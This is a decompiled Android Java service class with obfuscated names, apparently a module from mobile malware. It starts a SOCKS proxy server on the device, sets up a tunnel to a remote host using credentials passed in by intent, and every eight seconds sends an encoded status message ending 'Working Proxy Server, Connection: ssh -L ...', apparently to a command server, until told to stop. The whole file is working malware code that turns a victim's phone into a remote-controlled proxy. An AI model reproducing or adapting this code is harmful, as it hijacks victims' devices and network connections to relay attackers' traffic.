package wocwvy.czyxoxmbauu.slsa.kuv;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import java.net.ServerSocket;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class sfswwunyakpjr extends IntentService {

    /* renamed from: a */
    C0034b f439a = new C0034b();

    public sfswwunyakpjr() {
        super("sfswwunyakpjr");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        this.f439a.mo233d(this, "socks", "");
        String stringExtra = intent.getStringExtra("host");
        String stringExtra2 = intent.getStringExtra("user");
        String stringExtra3 = intent.getStringExtra("pass");
        String stringExtra4 = intent.getStringExtra("port");
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(34500);
                    StringBuilder sb = new StringBuilder();
                    sb.append("Port=");
                    sb.append(serverSocket.getLocalPort());
                    sfswwunyakpjr.this.f439a.mo213a("ProxyServer", sb.toString());
                    while (true) {
                        new Thread(new C0043a(serverSocket.accept())).start();
                    }
                } catch (Exception e) {
                    sfswwunyakpjr.this.f439a.mo213a("PORTERROR", "ERROR");
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        C0034b bVar = this.f439a;
        C0034b.m232a((Context) this, stringExtra, stringExtra2, stringExtra3, stringExtra4);
        this.f439a.mo213a("START", "START SOCKS");
        do {
            try {
                TimeUnit.MILLISECONDS.sleep(8000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            C0034b bVar2 = this.f439a;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(this.f439a.mo247q(this));
            sb2.append("|Working Proxy Server, Connection: ssh -L ");
            sb2.append(stringExtra4);
            sb2.append(":127.0.0.1:");
            sb2.append(stringExtra4);
            sb2.append(" ");
            sb2.append(stringExtra2);
            sb2.append("@");
            sb2.append(stringExtra);
            sb.append(bVar2.mo225c(sb2.toString()));
            this.f439a.mo218b(this, "4", sb.toString());
        } while (!this.f439a.mo234e(this, "socks").equals("stop"));
        try {
            thread.join();
        } catch (Exception unused) {
        }
        stopSelf();
    }
}
